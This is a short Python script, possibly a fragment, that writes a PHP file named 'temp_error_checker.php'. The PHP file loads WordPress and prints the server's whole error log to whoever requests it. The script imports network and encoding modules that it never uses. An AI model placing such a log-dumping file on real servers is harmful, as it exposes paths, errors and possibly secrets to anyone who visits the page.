#!/usr/bin/env python3
import urllib.request
import json
import base64

config_content = """<?php
require('./wp-load.php');
echo file_get_contents(ini_get('error_log'));
?>"""

with open("temp_error_checker.php", "w") as f:
    f.write(config_content)
